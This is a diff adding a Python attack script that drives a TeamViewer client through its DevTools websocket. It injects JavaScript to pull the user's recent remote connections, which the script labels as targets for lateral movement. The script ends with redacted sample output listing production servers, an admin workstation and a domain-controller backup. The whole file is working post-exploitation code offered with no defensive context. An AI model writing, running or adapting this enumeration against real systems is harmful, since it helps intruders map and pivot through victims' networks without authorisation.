@@ -1,0 +1,45 @@
+"""
+teamviewer_lateral_movement.py -- Recent connections
+Enumerates the machines the user has connected to.
+"""
+import websocket
+import json
+
+INTERNAL_DOMAIN = "https://teamviewer-internal-<HASH>"
+
+def enumerate_recent_connections(ws):
+    """List recent connections for lateral movement."""
+    js = f"""
+    (async () => {{
+        const r = await fetch(
+            '{INTERNAL_DOMAIN}/api/recentconnections/v1/recentconnections'
+        );
+        return JSON.stringify(await r.json());
+    }})()
+    """
+
+    ws.send(json.dumps({
+        "id": 40,
+        "method": "Runtime.evaluate",
+        "params": {"expression": js, "awaitPromise": True}
+    }))
+
+    result = json.loads(ws.recv())
+    data = json.loads(result["result"]["result"]["value"])
+
+    connections = data.get("connections", data)
+    print(f"[+] {len(connections)} recent connections:")
+    for conn in connections:
+        print(f"    ID: {conn.get('remoteId', 'N/A')}")
+        print(f"    Alias: {conn.get('alias', 'N/A')}")
+        print(f"    Last connected: {conn.get('lastConnected', 'N/A')}")
+        print()
+
+    return connections
+
+# Output (redacted):
+# 7 recent connections:
+#     ID: <TV_ID_1> | Alias: SRV-PROD-01 | Last: 2026-04-05
+#     ID: <TV_ID_2> | Alias: WKS-ADMIN-03 | Last: 2026-04-04
+#     ID: <TV_ID_3> | Alias: DC-BACKUP | Last: 2026-04-02
+#     ...
